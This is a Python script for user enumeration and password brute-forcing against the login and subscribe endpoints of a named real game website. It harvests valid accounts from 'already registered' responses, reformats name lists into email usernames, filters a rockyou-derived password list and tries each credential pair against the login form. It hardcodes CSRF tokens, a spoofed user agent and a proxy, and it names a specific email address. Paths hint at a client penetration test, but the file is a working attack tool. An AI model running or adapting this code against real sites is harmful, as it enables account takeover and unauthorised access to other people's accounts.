################################################################################
#                                                                              #
# This script is used to brute-force a login template on a website             #
#                                                                              #
################################################################################


## Import ##
# Original
import requests
import sys
from bs4 import BeautifulSoup

# Perso
sys.path.append('/home/the-freeman/Scripts/Reco')
from Read_File import file_library as file_lib


#################################################################################
#                                                                               #
# Function: Enumerate login from subscribe page                                 #
# Argument: - Username wordlist file (String)                                   #
# Return:                                                                       #
#                                                                               #
#################################################################################
def bruteforce_subscribe(username_file, result_file, domain_name):
    ## Variables
    response = []
    # DNS
    fqdn = 'www.' + domain_name
    remote_subscribe_path = '/en/subscribe/'
    # HTTP Request
    csrftoken = 'aOdDgSryriY5479S9AdywUHzXpIET1zEH6Jnzy10Jb1ei17bsMmz61VF33ACpXPO'
    csrfmiddlewaretoken = 'Sh26UUSAQWjCn0PjH4tBUKJVSiEg03MIpzyQdAs28PmLBUNC0gCCuRX1YWwewZ2S'
    cookies = {'csrftoken': csrftoken, \
    'django_language': 'en'}
    headers = {'Host': fqdn, \
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:74.0) Gecko/20100101 Firefox/74.0', \
               'Accept': '*/*', \
               'Accept-Language': 'en-US,en;q=0.5', \
               'Accept-Encoding': 'gzip, deflate', \
               'Referer': 'https://www.dualthegame.com/en/', \
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', \
               'X-CSRFToken': csrftoken, \
               'X-Requested-With': 'XMLHttpRequest', \
               'DNT': '1', \
               'Connection': 'close'}
    proxies = {'https': '127.0.0.1:8080'}
    url = 'https://www.' + domain_name
    username_list = file_lib.read_file(username_file)
    # username = 'kevdan01@officemalaga.com'

    file_lib.clear_file(result_file)

    for username in username_list:
        payload = {'csrfmiddlewaretoken': csrfmiddlewaretoken, \
        'email': username}

        try:
            resp = requests.post(url + remote_subscribe_path, headers=headers, cookies=cookies, data=payload, proxies=proxies, verify=False, timeout=2)
            # resp_soup = BeautifulSoup(resp.text,"html.parser")
            resp_json = resp.json()
            print('**** DEBUG - resp json *****')
            print(resp_json)
        except (requests.ConnectionError,requests.HTTPError, requests.Timeout, requests.TooManyRedirects) as e:
            print('**** CONNECTION FAILED ****')
            print(e)
        else:
            if 'message' in resp_json:
                if 'are already registered' in resp_json['message']:
                    print(username + ': SUCCESS')
                    response.append(username + ': SUCCESS')
                    file_lib.append_to_file(result_file, response)
                else:
                    print(username + ': FAILED')
                    # print(resp_json)
                    response.append(username + ': FAILED')
                    # file_lib.append_to_file(result_file, response)
            else:
                print(username + ': FAILED')
                # print(resp_json)
                response.append(username + ': FAILED')
                # file_lib.append_to_file(result_file, response)

    file_lib.write_to_file(result_file, response)
        # file_lib.append_to_file(result_file, str.splitlines(resp_soup.prettify()))


    return 0

#################################################################################
#                                                                               #
# Function: Bruteforce a login page                                             #
# Arguments: - Username wordlist file (String)                                  #
#           - Password wordlist file (String)                                   #
# Return:                                             #
#                                                                               #
#################################################################################
def bruteforce_login(username_file, passwd_file, domain_name, result_file):
    ## Variables
    response = []
    # DNS
    fqdn = 'www.' + domain_name
    remote_subscribe_path = '/en/login/'
    # File
    # result_file = 'Result/ID_valid.txt'
    # HTTP Request
    csrftoken = 'aOdDgSryriY5479S9AdywUHzXpIET1zEH6Jnzy10Jb1ei17bsMmz61VF33ACpXPO'
    csrfmiddlewaretoken = 'jEV7CzaoSeivSm1XV4aoQ3BJGN6zIgVDQWrRVfKQa7lE6gZgegjpqaPPMrYxecbN'
    cookies = {'csrftoken': csrftoken, \
    'django_language': 'en'}
    headers = {'Host': fqdn, \
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:74.0) Gecko/20100101 Firefox/74.0', \
               'Accept': '*/*', \
               'Accept-Language': 'en-US,en;q=0.5', \
               'Accept-Encoding': 'gzip, deflate', \
               'Referer': 'https://www.dualthegame.com/en/', \
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', \
               'X-CSRFToken': csrftoken, \
               'X-Requested-With': 'XMLHttpRequest', \
               'DNT': '1', \
               'Connection': 'close'}
    proxies = {'https': '127.0.0.1:8080'}
    url = 'https://www.' + domain_name
    username_list = file_lib.read_file(username_file)
    password_list = file_lib.read_file(passwd_file)
    # username = 'kevdan01@officemalaga.com'
    # password = '11111111'


    for password in password_list:
        for username in username_list:
            payload = {'csrfmiddlewaretoken': csrfmiddlewaretoken, \
            'next': '', \
            'username': username, \
            'password': password}
            try:
                resp = requests.post(url + remote_subscribe_path, headers=headers, \
                cookies=cookies, data=payload, proxies=proxies, allow_redirects=False, \
                verify=False, timeout=2)
                resp_soup = BeautifulSoup(resp.text,"html.parser")
                # resp_json = resp.json()
                print('**** DEBUG - Response *****')
                if resp.status_code == 302:
                    print('SUCCESSFUL Auth')
                    print('user: ' + username)
                    print('password: ' + password)
                else:
                    print('FAILED Auth')
                    print('user: ' + username)
                    print('password: ' + password)
                # print(resp.headers['set-cookie'])
                # print(resp_json)
            except (requests.ConnectionError,requests.HTTPError, requests.Timeout, requests.TooManyRedirects) as e:
                print('**** CONNECTION FAILED ****')
                print(e)
            else:
                print('**** Connection OK ****')

    file_lib.write_to_file(result_file, response)
        # file_lib.append_to_file(result_file, str.splitlines(resp_soup.prettify()))

#################################################################################
#                                                                               #
# Function: Removed non compliant length password from the password file        #
# Argument: - Password wordlist file (String)                                   #
# Return:                                             #
#                                                                               #
#################################################################################
def adjust_psswd_size(passwd_file, passwd_file_modif):
    ## Variables
    i = 0
    passwd_list = []
    new_passwd_list = []

    passwd_list = file_lib.read_file(passwd_file)

    # Remove password from the list if it matchs the condition
    for passwd in passwd_list:
        if len(passwd) >= 8:
            new_passwd_list.append(passwd)
            # passwd_list.pop(i)
            # print('passwd pop: ' + passwd)
            # print('i: ' + str(i))
        # i += 1

    # Save to file the new password list
    file_lib.write_to_file(passwd_file_modif, new_passwd_list)

    return 0

#################################################################################
#                                                                               #
# Function: Format username list to comply with a specific username policy      #
# Argument: - Username wordlist file (String)                                   #
# Return: 0                                                                     #
#                                                                               #
#################################################################################
def adjust_username(username_file, username_file_modif, domain_name):
    ## Variables
    username_list_init = []
    username_list_final = []
    space_count = 0
    char_01 = ''
    char_02 = ''
    split_string = []

    username_list_init = file_lib.read_file(username_file)

    # Check wether a username contains several firstname
    for username in username_list_init:
        space_count = username.count(' ')
        split_string = username.split(' ')
        char_01 = username[0]

        if space_count == 1:
            usernames_modif = char_01 + split_string[1] + '@' + domain_name
            username_list_final.append(usernames_modif.casefold())
            # print('**** Username init: ' + username + ' ****')
            # print('**** Username modif: ' + usernames_modif + ' ****')
        elif space_count == 2:
            # Get the first character of the second firstname
            char_02 = split_string[1][0]
            usernames_modif = char_01 + char_02 + split_string[2] + '@' + domain_name
            username_list_final.append(usernames_modif.casefold())
            # print('**** Username init: ' + username + ' ****')
            # print('**** Username modif: ' + usernames_modif + ' ****')
        else:
            print('**** ERROR - Adjust_username - space_count out of limit ****')

    file_lib.write_to_file(username_file_modif, username_list_final)

    return 0

### Main Program ###
if __name__ == '__main__':
    ## Variables
    username_file = 'Wordlist/Original/usernames_nov.txt'
    # username_file_modif = 'Wordlist/Modified/usernames_nov_modif.txt'
    # username_file_modif = '/home/the-freeman/Security/Clients/Nov/Enum/username_list_valid.txt'
    username_file_modif = '/home/the-freeman/Security/Clients/Nov/Wordlist/user_temp.txt'
    # passwd_file = 'Wordlist/Original/rockyou-75.txt'
    # passwd_file_modif = 'Wordlist/Modified/rockyou-75.txt_modif.txt'
    passwd_file_modif = '/home/the-freeman/Security/Clients/Nov/Wordlist/pass_temp.txt'
    # DNS
    domain_name = 'dualthegame.com'
    # File
    result_file = 'Result/enum_user_result.txt'


    # print('**** Starting Adjusting Password List ****')
    # adjust_psswd_size(passwd_file, passwd_file_modif)
    # print('**** Starting Adjusting Username List ****')
    # adjust_username(username_file, username_file_modif, domain_name)
    # print('**** Starting Username Enumeration ****')
    # bruteforce_subscribe(username_file_modif, result_file, domain_name)
    print('**** Starting bruteforce password ****')
    bruteforce_login(username_file_modif, passwd_file_modif, domain_name, result_file)





















# Space
